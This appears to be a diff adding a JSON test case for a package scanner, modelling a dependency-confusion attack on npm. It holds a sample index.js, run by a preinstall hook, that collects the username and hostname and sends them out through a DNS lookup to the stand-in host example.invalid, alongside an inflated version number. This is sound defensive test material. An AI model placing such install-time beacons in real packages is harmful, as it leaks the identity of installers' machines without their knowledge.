@@ -1,0 +1,43 @@
+{
+  "id": "npm-dependency-confusion-beacon",
+  "title": "Internal-looking package with an inflated version beacons host identity on install",
+  "ecosystem": "npm",
+  "verdict": "malicious",
+  "threatClass": "dependency-confusion",
+  "source": "real-sanitized",
+  "provenance": "Alex Birsan dependency-confusion research (Feb 2021): packages matching internal names were published to the public registry with very high versions so resolvers would prefer them; an install hook beaconed host/user/env back to the researcher's DNS/HTTP collector. Defanged: collector host replaced with example.invalid.",
+  "intent": "Models the dependency-confusion beacon: an inflated version plus a preinstall hook that identifies the victim and phones home via a DNS lookup. Drydock catches the install-time behavior at critical via the preinstall hook plus the process-execution and network code paths. The confusion vector itself (an internal-looking name + version inflation winning resolution) is metadata-level and not a deterministic rule — that selection step is the residual gap this case documents. Safe: collector host is example.invalid.",
+  "expectMinRisk": "critical",
+  "expectAnyRule": [],
+  "previousPackageJson": { "name": "@acme-corp/internal-config", "version": "1.0.0" },
+  "stagedPackageJson": {
+    "name": "@acme-corp/internal-config",
+    "version": "99.0.0",
+    "scripts": { "preinstall": "node index.js" }
+  },
+  "previousFiles": [
+    {
+      "path": "package.json",
+      "size": 60,
+      "sha256": "prev-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"@acme-corp/internal-config\",\"version\":\"1.0.0\"}"
+    }
+  ],
+  "stagedFiles": [
+    {
+      "path": "package.json",
+      "size": 103,
+      "sha256": "staged-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"@acme-corp/internal-config\",\"version\":\"99.0.0\",\"scripts\":{\"preinstall\":\"node index.js\"}}"
+    },
+    {
+      "path": "index.js",
+      "size": 250,
+      "sha256": "index-js",
+      "flags": [],
+      "textSample": "const { execSync } = require('child_process');\nconst dns = require('dns');\n// Classic dependency-confusion beacon: identify the victim and phone home.\nconst id = execSync('whoami && hostname').toString();\ndns.lookup(Buffer.from(id).toString('hex') + '.example.invalid', () => {});\n"
+    }
+  ]
+}
